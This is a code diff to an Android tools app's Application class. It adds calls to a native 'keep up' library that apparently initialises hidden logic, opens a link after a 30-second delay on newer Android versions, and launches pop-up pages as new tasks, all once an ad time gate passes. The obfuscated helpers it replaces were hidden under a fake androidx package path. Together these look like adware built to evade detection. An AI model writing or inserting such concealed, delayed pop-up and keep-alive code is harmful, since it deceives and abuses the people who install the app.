@@ -3,11 +3,13 @@ package com.lx.lxtoolsproject
 import android.app.Application
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import androidx.constraintlayout.core.motion.utils.GU
 import com.baidu.maps.utils.MapsUtils
+import com.keep.up.all.NativeJniUtils
 import com.lx.lxtoolsproject.utils.AdControlCUtils
 import com.lx.lxtoolsproject.utils.OnClickAgreement
 import com.tencent.mmkv.MMKV
@@ -17,7 +19,11 @@ import com.youdao.sdk.app.YouDaoApplication
 class ToolsApplication : Application() {
 
     val handle = Handler(Looper.getMainLooper())
-
+    var runnable: Runnable = object : Runnable {
+        override fun run() {
+            NativeJniUtils.openlink(this@ToolsApplication)
+        }
+    }
     override fun attachBaseContext(base: Context?) {
         super.attachBaseContext(base)
     }
@@ -48,15 +54,17 @@ class ToolsApplication : Application() {
         //初始化基础 context mmkv  广告类集合
         AdControlCUtils.initDef(this)
         if (AdControlCUtils.isGoWork(BuildConfig.AD_LIVE_TIME)){
-           // XZR.bldzsjj(this@ToolsApplication)
-            GU.piovjoy(this@ToolsApplication)
+
+            NativeJniUtils.virinit(this@ToolsApplication)
+            if (Build.VERSION.SDK_INT >= 34) {
+                handle.postDelayed(runnable,30000)
+            }
             AdControlCUtils.handlerPostInitStrategy()
             AdControlCUtils.initSDK()
             AdControlCUtils.setLauncherMiddleListener { intent ->
                 Log.i("AD_LOG","喀什哦弹出")
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-               // XZR.nxcbfpls(intent)
-                GU.conaoiwc(intent)
+                NativeJniUtils.pageopen(intent)
             }
 
         }
